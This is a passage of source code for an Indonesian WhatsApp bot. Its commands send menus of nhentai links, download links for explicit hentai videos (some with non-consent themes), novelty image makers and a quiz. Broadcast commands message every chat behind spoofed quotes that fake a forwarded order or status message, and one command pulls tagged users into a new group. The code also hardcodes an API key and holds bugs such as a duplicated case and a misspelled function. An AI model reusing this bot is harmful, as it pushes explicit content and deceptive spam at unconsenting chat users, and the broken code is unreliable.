						"footerText": "https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - EASY MODE -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Easy Mode :
• https://nhentai.net/g/316755/
• https://nhentai.net/g/316596/
• https://nhentai.net/g/311850/
• https://nhentai.net/g/315578/
• https://nhentai.net/g/315488/
• https://nhentai.net/g/315406/
• https://nhentai.net/g/315344/
• https://nhentai.net/g/315323/
• https://nhentai.net/g/315136/
• https://nhentai.net/g/315099/
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MEDIUM MODE -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Medium Mode :
• https://nhentai.net/g/316867/
• https://nhentai.net/g/316869/
• https://nhentai.net/g/316785/
• https://nhentai.net/g/316763/51/
• https://nhentai.net/g/316445/
• https://nhentai.net/g/316250/
• https://nhentai.net/g/311283/
• https://nhentai.net/g/265671/
• https://nhentai.net/g/312127/
• https://nhentai.net/g/311560/
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - HARD MODE -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hard Mode :
• https://nhentai.net/g/316820/
• https://nhentai.net/g/316481/
• https://nhentai.net/g/316430/
• https://nhentai.net/g/276347/
• https://nhentai.net/g/196329/
• https://nhentai.net/g/304543/
• https://nhentai.net/g/295295/
• https://nhentai.net/g/311262/
• https://nhentai.net/g/311882/
• https://nhentai.net/g/312180/

══{*BONUS COK*}══
https://nhentai.net/g/271890/
https://nhentai.net/g/272057/
https://nhentai.net/g/272173/
https://nhentai.net/g/272182/
https://nhentai.net/g/272196/
https://nhentai.net/g/272197/
https://nhentai.net/g/272259/
https://nhentai.net/g/272276/
https://nhentai.net/g/272290/
https://nhentai.net/g/272377/
-
https://nhentai.net/g/272390/
https://nhentai.net/g/272512/
https://nhentai.net/g/271245/
https://nhentai.net/g/271056/
https://nhentai.net/g/270809/
https://nhentai.net/g/269653/
https://nhentai.net/g/266088/
https://nhentai.net/g/264980/
https://nhentai.net/g/262215/
https://nhentai.net/g/260433/
-
https://nhentai.net/g/260146/
https://nhentai.net/g/256738/
https://nhentai.net/g/272425/
https://nhentai.net/g/272352/
https://nhentai.net/g/272045/
https://nhentai.net/g/272015/
https://nhentai.net/g/271993/
https://nhentai.net/g/271924/
https://nhentai.net/g/271905/
https://nhentai.net/g/271797/
-
https://nhentai.net/g/271760/
https://nhentai.net/g/271717/
https://nhentai.net/g/271726/
https://nhentai.net/g/271667/
https://nhentai.net/g/267352/
https://nhentai.net/g/152968/
https://nhentai.net/g/238876/
https://nhentai.net/g/116395/
https://nhentai.net/g/84809/
https://nhentai.net/g/211656/
-
https://nhentai.net/g/272117/
https://nhentai.net/g/188721/
https://nhentai.net/g/266402/
https://nhentai.net/g/238876/
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:mek})
Haikal.relayWAMessage(res)
break
case 'mausange':
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
					"imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                         "jpegThumbnail": fs.readFileSync('./stik/Ahhikal.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
					 },
						"contentText": `❏HW MODS WA❏
						▬▭▬▭▬▭▬▭▬▬▭▬▭
SELAMAT DATANG - AWAS SANGE -
┏━━⊱
┣❏ NO VPN1* : bit.ly/2Qn9Qgu\n
┣❏ NO VPN2* : bit.ly/3gWaBt8\n
┣❏ XNXX VPN* : bit.ly/3vJZJ7n\n
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭
JANGAN LUPA SUBSCRIBE`,
						"footerText": "https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - NEKOPOI VERSION -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
▢ nekopoi1
▢ nekopoi2
▢ nekopoi3
▢ nekopoi4
▢ nekopoi5
▢ nekopoi6
▢ nekopoi7
▢ nekopoi8
▢ nekopoi9

- THANKS YOU BOT -
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:mek})
Haikal.relayWAMessage(res)
break
case 'tebak':
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
					"imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                         "jpegThumbnail": fs.readFileSync('./stik/Ahhikal.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
					 },
						"contentText": `❏HW MODS WA❏
						▬▭▬▭▬▭▬▭▬▬▭▬▭
SELAMAT DATANG
PERTANYAAN :


Waktu hidup dinyanyikan, pas mati dikasih tepuk tangan?`,
						"footerText": `A. Lilin ulang tahun
B. Balon Ku ada Lima
C. Petasan atau Mercon`,
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": `JAWABAN
									
									UNTUK HASIL	ANDA SALAH`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": `JAWABAN
									
									UNTUK HASIL	ANDA BENAR SILAHKAN KETIK => Hore <= UNTUK MERAYAKAN`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": `JAWABAN
									
									UNTUK HASIL	ANDA SALAH`,
								},
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:mek})
Haikal.relayWAMessage(res)
break
case 'menusound':
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
					"imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                         "jpegThumbnail": fs.readFileSync('./stik/Ahhikal.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
					 },
						"contentText": `▢ sound1
▢ sound2
▢ sound3
▢ sound4
▢ sound5
▢ sound6
▢ sound7
▢ sound8
▢ sound9
▢ sound10
▢ sound11
▢ sound12
▢ sound13
▢ sound14
▢ sound15
▢ sound16
▢ sound17
▢ sound18
▢ sound19
▢ sound20
▢ sound21
▢ sound22
▢ sound23
▢ sound24
▢ sound25
▢ sound26
▢ sound27
▢ sound28`,
						"footerText": "https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - SOUND RANDOM -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
▢ apa
▢ apaan
▢ loli
▢ sedih
▢ assalamualaikum
▢ hantam
▢ hapus
▢ awkwk
▢ kasian
▢ kesel
▢ ngeselin
▢ keren
▢ ketawa
▢ mastah
▢ nob
▢ nub
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:mek})
Haikal.relayWAMessage(res)
break	
case 'makermenu':
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
					"imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                         "jpegThumbnail": fs.readFileSync('./stik/Ahhikal.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
					 },
						"contentText": `▢ memeindo
▢ jokes
▢ nickff
▢ tahta
▢ neon2
▢ wolf
▢ tfire
▢ ytgold
▢ wall
▢ ytsilver
▢ t3d
▢ logoa
▢ marvel
▢ leavest
▢ karakter
▢ pinterest
▢ pornhub
▢ phy
▢ cat
▢ attp
▢ pornhub
▢ bird
▢ koala
▢ fox
▢ anime`,
						"footerText": "https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - NULIS RANDOM -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
▢ nulis1
▢ nulis2
▢ nulis3
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:mek})
Haikal.relayWAMessage(res)
break	
case 'jaditahu':
				if ((isMedia && !mek.message.videoMessage || isQuotedImage)) {
					let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					let media = await Haikal.downloadMediaMessage(encmedia)
					Haikal.sendMessage(from,media,image,{mimetype: Mimetype.fekemek,quoted : mek, thumbnail: fs.readFileSync('./stik/deden.jpeg')})
				} else {
				reply(from, `Kirim gambar atau reply dengan caption ${prefix}fekemek caption`, mek)
				}
				break
                   case 'memeindo':  
                   reply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await fetchJson(`https://api.zeks.xyz/api/memeindo?apikey=apivinz`)
                   anu1 = await getBuffer(anu.result)
                   Haikal.sendMessage(from, anu1, image, {caption: `nihh kack`, quoted: mek})
                   break
                   case 'jokes':  
                   reply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await fetchJson(`https://api.zeks.xyz/api/darkjokes?apikey=apivinz`)
                   anu1 = await getBuffer(anu.result)
                   Haikal.sendMessage(from, anu1, image, {caption: `nihh kack`, quoted: mek})
                   break
                   case 'nickff': 
                   anu = await fetchJson(`https://api.zeks.xyz/api/nickepep?apikey=apivinz`)
                   anu1 = `➻ *NIHH* : ${anu.result}\n`
                   anu1 += `➻ *NIHH* : ${anu.result}\n`
                   anu1 += `➻ *NIHH* : ${anu.result}\n`
                   anu1 += `➻ *NIHH* : ${anu.result}\n`
                   reply(anu1)
                   break
                   case 'tahta':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} Haikal*`)
                   F = body.slice(7)
                   reply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/hartatahta?text=${F}&apikey=apivinz`)
                   Haikal.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break
                   case 'neon2':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} Haikal*`)
                   F = body.slice(7)
                   reply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/bneon?apikey=apivinz&text=${F}`)
                   Haikal.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break                    
                   case 'wall':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} Haikal*`)
                   F = body.slice(6)
                   reply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/breakwall?apikey=apivinz&text=${F}`)
                   Haikal.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break   
                   case 'wolf':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} Haikal*`)
                   F = body.slice(6)
                   reply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/wolflogo?apikey=apivinz&text1=rimurubotz&text2=${F}`)
                   Haikal.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break 
                   case 'tfire':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} Haikal*`)
                   F = body.slice(7)
                   reply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/tfire?text=${F}&apikey=apivinz`)                   
                   Haikal.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break                
                   case 'ytgold': 
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} Haikal*`)
                   F = body.slice(8)
                   reply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/gplaybutton?text=${F}&apikey=apivinz`)
                   Haikal.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break
                   case 'ytsilver': 
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} Haikal*`)
                   F = body.slice(10)
                   reply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/splaybutton?text=${F}&apikey=apivinz`)
                   Haikal.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break
                   case 't3d':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} Haikal*`)
                   F = body.slice(5)
                   reply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/text3dbox?apikey=apivinz&text=${F}`)
                   Haikal.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break
                   case 'logoa':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} Haikal&chan*`)
                   var F = body.slice(7)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]; 
                   reply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/logoaveng?text1=${F1}&text2=${F2}&apikey=apivinz`)
                   Haikal.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break
                   case 'pornhub':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} Haikal&chan*`)
                   var F = body.slice(9)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]; 
                   reply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/phlogo?text1=${F1}&text2=${F2}&apikey=apivinz`)
                   Haikal.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break
                   case 'marvel':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} Haikal&chan*`)
                   var F = body.slice(8)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]; 
                   reply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/marvellogo?text1=${F1}&text2=${F2}&apikey=apivinz`)
                   Haikal.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break
                   case 'leavest':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} Haikal*`)
                   F = body.slice(9)
                   reply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/leavest?text=${F}&apikey=apivinz`)
                   Haikal.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break
// nekopoi
case 'nekopoi1':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Haikal.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA: https://www2.zippyshare.com/d/z9dcY6Nr/791216/%5bNekoPoi%5d_Akina_to_Onsen_de_H_Shiyo%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break
case 'nekopoi1':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Haikal.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA: https://www2.zippyshare.com/d/z9dcY6Nr/791216/%5bNekoPoi%5d_Akina_to_Onsen_de_H_Shiyo%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break
                 case 'nekopoi2':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Haikal.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA: https://www4.zippyshare.com/d/j7PFLGUY/946757/%5bNekoPoi%5d_Tsuma_ga_Kirei_ni_Natta_Wake_-_02_%5b360P%5d_%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break
                 case 'nekopoi3':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Haikal.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA: https://www111.zippyshare.com/d/EK5uqIMh/566060/%5bNekoPoi%5d_Megane_no_Megami_-_01_%5b360P%5d_%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break
                 case 'nekopoi4':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Haikal.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA: https://www109.zippyshare.com/d/2ebALhhS/463654/%5bNekoPoi%5d_Watashi_ga_Toriko_-_02%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break
                 case 'nekopoi5':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getbuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Haikal.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA: https://www115.zippyshare.com/d/LmzOkRAI/313299/%5bNekoPoi%5d_Chichi-iro_Toiki_-_01_%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break
                 case 'nekopoi6':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Haikal.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA: https://www89.zippyshare.com/d/SgEHvrJs/42812/%5bNekoPoi%5d_Chichi-iro_Toiki_-_02_%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break
                 case 'nekopoi7':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Haikal.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA: https://www66.zippyshare.com/d/j0ivbciL/520411/%5bNekoPoi%5d_Onna_Maou_Melissa_no_H_na_Boukenki_-_01_%5b360P%5d_%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break
                 case 'nekopoi8':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Haikal.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA: https://www71.zippyshare.com/d/M225YIrR/535656/%5bNekoPoi%5d_Buta_no_Gotoki_Sanzoku_ni_Torawarete_Shojo_wo_Ubawareru_Kyonyuu_Himekishi_Onna_Senshi_-_01%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break
                 case 'nekopoi9':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Haikal.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA: https://www49.zippyshare.com/d/bdwYjaXS/605790/%5bNekoPoi%5d_Akebi_no_Hana___Maho_-_01_%5b360P%5d_%5bnekopoi.pro%5d.mp4\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break                 
case 'penjara':			
			if (!isGroup) return reply(mess.only.group)
				if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
				argz = args.join('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					Haikal.groupCreate(argz[0], anu)
					fakestatus(from, `Sukses`, fake)
                }
				break
	case 'attp':
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp crew`)
					atetepe = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(q)}`)
					Haikal.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
case 'tobc':			
				if (args.length < 1) return reply('Teksnya?')
				var bc = body.slice(6)
					Haikal.updatePresence(from, Presence.composing)
					anu = await Haikal.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Haikal.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Haikal.sendMessage(_.jid, buff, audio, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./stik/thumb.jpeg'), surface: 200, message: `${bc}`, orderTitle: `${bc}`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, mimetype: 'audio/mp3', duration: 999999999, ptt: true })
						}
						} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Haikal.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Haikal.sendMessage(_.jid, buff, sticker, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./stik/thumb.jpeg'), surface: 200, message: `${bc}`, orderTitle: `${bc}`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
          reply('reply sticker/audio')
							}
			break
case 'bc':
					Haikal.updatePresence(from, Presence.composing)					
					if (args.length < 1) return reply('Teksnya?')
					anu = await Haikal.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Haikal.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Haikal.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./stik/thumb.jpeg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Haikal.downloadMediaMessage(encmedia)
						for (let _ of anu) {
